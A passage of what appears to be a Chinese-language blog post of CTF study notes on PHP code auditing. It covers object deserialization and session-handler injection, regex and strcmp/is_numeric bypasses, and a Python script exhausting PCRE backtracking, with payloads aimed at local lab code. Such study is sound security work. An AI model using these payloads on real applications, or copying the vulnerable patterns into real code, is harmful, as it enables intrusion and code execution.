class="string">'O:4:"test":3:&#123;s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"file";s:32:"D:\app\phpstudy_pro\WWW\flag.php";&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name;</span><br><span class="line">    <span class="keyword">var</span> $wallet;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;wallet = <span class="keyword">new</span> Wallet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print_info</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Name: &#123;$this-&gt;name&#125;&lt;br/&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Wallet: &#123;$this-&gt;wallet&#125;"</span>;   <span class="comment">//这里触发  输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wallet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $paper_money;</span><br><span class="line">    <span class="keyword">var</span> $coin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;paper_money = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coin = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"paper money: &#123;$this-&gt;paper_money&#125;; coin: &#123;$this-&gt;coin&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"flag&#123;xxxx-xxxx-xxxx-xxxx&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$name = <span class="string">"admin"</span>;</span><br><span class="line">$passwd = <span class="string">"QNKCDZO"</span>;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> User($name);  <span class="comment">//$this-&gt;wallet = new Wallet;</span></span><br><span class="line">$user-&gt;wallet=<span class="keyword">new</span> Flag();</span><br><span class="line">$user = serialize($user);</span><br><span class="line"><span class="keyword">echo</span> $user;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有反序列化的机会干嘛不抓住呢，加上FLAG()函数呀</span></span><br><span class="line"><span class="comment">//O:4:"User":2:&#123;s:4:"name";s:5:"admin";s:6:"wallet";O:6:"Wallet":2:&#123;s:11:"paper_money";i:1;s:4:"coin";i:1;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//echo phpinfo(); </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    我们开始构造实例，伪造user来输出flag。flag在Flag中，但没有<span class="keyword">echo</span>函数，没办法输出。只有User可以输出，所以我们先构造User实例，然后将Wallet换成Flag,这样在调用user-&gt;print_info()时会调用User&gt;Flag&gt;_tostring()函数，然后将flag输出来</span><br></pre></td></tr></table></figure>

<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p>protect对象序列化时会有%00,%00对应的ascii值为0不在那个范围内，找资料发现php7.1对于属性类型不敏感，改为public</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;     <span class="number">2.</span><span class="keyword">$this</span>-&gt;op就为int2 之后 </span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();                就<span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);             <span class="number">4.</span><span class="keyword">$this</span>-&gt;output</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);         <span class="number">3.</span>包含flag.php文件  filename是可控的，赋值为flag.php</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;         </span><br><span class="line">        <span class="keyword">echo</span> $s;                             <span class="number">5.</span><span class="keyword">echo</span>结果 即flag.php的内容</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;         <span class="number">0.</span>调用__destruct析构方法</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)   <span class="number">1.</span>用int2使之不相等  <span class="keyword">$this</span>-&gt;op就为int2</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"><span class="comment">//后面的函数必须删掉了 要不然会影响类对象的赋值</span></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:5:"*op";i:2;s:11:"*filename";s:8:"flag.php";s:10:"*content";N;&#125;</span></span><br><span class="line"><span class="comment">//echo phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在源码处找到flag</span><br></pre></td></tr></table></figure>



<h2 id="session-反序列化漏洞"><a href="#session-反序列化漏洞" class="headerlink" title="session 反序列化漏洞"></a>session 反序列化漏洞</h2><p>主要原因是<br> ini_set(‘session.serialize_handler’, ‘php_serialize’);<br> ini_set(‘session.serialize_handler’, ‘php’);<br> 两者处理session的方式不同</p>
<p>利用下面代码可以生成session值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);&#x2F;&#x2F;a:1:&#123;s:6:&quot;spoock&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);&#x2F;&#x2F;a|s:3:&quot;111&quot;</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;spoock&quot;]&#x3D;$_GET[&quot;a&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看看生成的session值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">spoock|s:3:&quot;111&quot;;    &#x2F;&#x2F;session键值|内容序列化</span><br><span class="line">a:1:&#123;s:6:&quot;spoock&quot;;s:3:&quot;111&quot;;&#125;a:1:&#123;s:N:session键值;内容序列化&#125;</span><br><span class="line">在ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);中把|之前认为是键值后面的视为序列化</span><br><span class="line">那么就可以利用这一漏洞执行一些恶意代码</span><br></pre></td></tr></table></figure>

<p>看下面的例子<br> 1.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;spoock&quot;]&#x3D;$_GET[&quot;a&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class lemon &#123;</span><br><span class="line">    var $hi;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;hi &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">         eval($this-&gt;hi);&#x2F;&#x2F;这里很危险，可以执行用户输入的参数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在1.PHP里面输入a参数序列化的值|O:5:”lemon”:1:{s:2:”hi”;s:10:”phpinfo();”;}<br> 则被序列化为<br> a:1:{s:6:”spoock”;s:44:”|O:5:”lemon”:1:{s:2:”hi”;s:10:”phpinfo();”;}<br> 在2.PHP里面打开<br> 就可以执行phpinfo（）了 </p>
<h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727144617655.png" alt="image-20200727144617655"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727144627313.png" alt="image-20200727144627313"></p>
<h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p> <img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727144736487.png" alt="image-20200727144736487"></p>
<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145122156.png" alt="image-20200727145122156"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) </span><br><span class="line">当 pattern为<span class="string">'/xxxxx/e'</span>时，将会把replacement作为php代码执行。</span><br></pre></td></tr></table></figure>

<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727151133855.png" alt="image-20200727151133855"></p>
<h4 id="数组绕过-返回是0-false"><a href="#数组绕过-返回是0-false" class="headerlink" title="数组绕过 返回是0 false"></a>数组绕过 返回是0 false</h4><p> <code>preg_match(pattern,array) = false</code></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727151333681.png" alt="image-20200727151333681"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727151745546.png" alt="image-20200727151745546"></p>
<h4 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h4><p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">'1.1.1.1 abcd'</span>; <span class="comment">// 可以绕过</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>,$ip)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span>(<span class="string">'key...'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="PCRE回溯次数限制-返回是0-false"><a href="#PCRE回溯次数限制-返回是0-false" class="headerlink" title="PCRE回溯次数限制  返回是0 false"></a>PCRE回溯次数限制  返回是0 false</h4><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727152045004.png" alt="image-20200727152045004"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727152253982.png" alt="image-20200727152253982"></p>
<p>if(!is_array($greeting)) 验证提交的变量是否为数组，所以上面的方法就用不了了</p>
<p>查资料知道了（详细资料：<a href="http://www.laruence.com/2010/06/08/1579.html）" target="_blank" rel="noopener">http://www.laruence.com/2010/06/08/1579.html）</a></p>
<p>在PHP的pcre扩展中, 提供了俩个设置项</p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/clip_image004-1573826613927.jpg" alt="img"></p>
<p>我本地的回溯上限为1000000，默认的回溯上限为100000。</p>
<p>当输入的字符串超过这个限制的时候，preg_match()这个函数就会出错，返回false</p>
<p>构造payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"greeting"</span>:<span class="string">"Merry Christmas"</span> + <span class="string">"aaaaa"</span> * <span class="number">1000000</span>&#125;</span><br><span class="line">res = requests.post(<span class="string">'http://localhost/test.php'</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> res.content</span><br></pre></td></tr></table></figure>

<p>本地测试结果</p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/clip_image005-1573826613927.png" alt="img"></p>
<p>成功绕过正则匹配函数，成功绕过拿到flag</p>
<h4 id="换行符（-不会匹配换行符）"><a href="#换行符（-不会匹配换行符）" class="headerlink" title="换行符（.不会匹配换行符）"></a>换行符（.不会匹配换行符）<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727152915882.png" alt="image-20200727152915882"></h4><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727152642254.png" alt="image-20200727152642254"></p>
<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p> <img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145239367.png" alt="image-20200727145239367"></p>
<p>同类函数</p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145417198.png" alt="image-20200727145417198"></p>
<h2 id="动态函数执行-GET-39-a-39-GET-39-b-39"><a href="#动态函数执行-GET-39-a-39-GET-39-b-39" class="headerlink" title="动态函数执行  $_GET[&#39;a&#39;]($_GET[&#39;b&#39;])"></a>动态函数执行  <code>$_GET[&#39;a&#39;]($_GET[&#39;b&#39;])</code></h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145555349.png" alt></p>
<h2 id="strcmp-比较数组和字符串的时候，返回是0-false-两者相等"><a href="#strcmp-比较数组和字符串的时候，返回是0-false-两者相等" class="headerlink" title="strcmp  比较数组和字符串的时候，返回是0 false 两者相等"></a>strcmp  比较数组和字符串的时候，返回是0 false 两者相等</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727145737809.png" alt="image-20200727145737809"></p>
<p>strcmp(array(), “abc”) = null</p>
<p>Strcmp利用<strong>数组绕过</strong><br>int strcmp ( string $str1 , string $str2 )<br>当输入的两个值为不是字符串时就会产生不预期的返回值:<br>输入password[]=1则返回success，成功绕过验证</p>
<p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br> 5.2 中是将两个参数先转换成string类型。<br> 5.3.3以后，当比较数组和字符串的时候，返回是0。<br> 5.5 中如果参数不是string类型，直接return了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=$_GET[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="string">'xd'</span>,$password)) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'NO!'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'YES!  flag&#123;aaa_nb&#125;'</span>;    传password[]=<span class="number">1223</span>zv3232vdas  后面无论打什么都能输出yes</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>存在以下情况</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strcmp(<span class="string">"foo"</span>, <span class="keyword">array</span>()) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br><span class="line">strcmp(<span class="string">"foo"</span>, <span class="keyword">new</span> stdClass) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br><span class="line">strcmp(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;, <span class="string">""</span>) =&gt; <span class="keyword">NULL</span> + PHP Warning</span><br></pre></td></tr></table></figure>

<h2 id="is-numeric-intval"><a href="#is-numeric-intval" class="headerlink" title="is_numeric()/intval()"></a>is_numeric()/intval()</h2><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727150632061.png" alt="image-20200727150632061"></p>
<p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。</p>
<p>第二个函数is_numeric()判断是否为数字，因为PHP的弱类型，将数字后面加上<strong>空格</strong>或者<strong>任意一个字符</strong>即可绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">233333</span>);       <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'233333'</span>);    <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">0x233333</span>);    <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'0x233333'</span>);   <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'233333abc'</span>);  <span class="comment"># 0</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">ctf不能是纯数字，但是要大于<span class="number">87654321</span></span><br><span class="line">ctf[]=<span class="number">9999999999</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727150937984.png" alt="image-20200727150937984"></p>
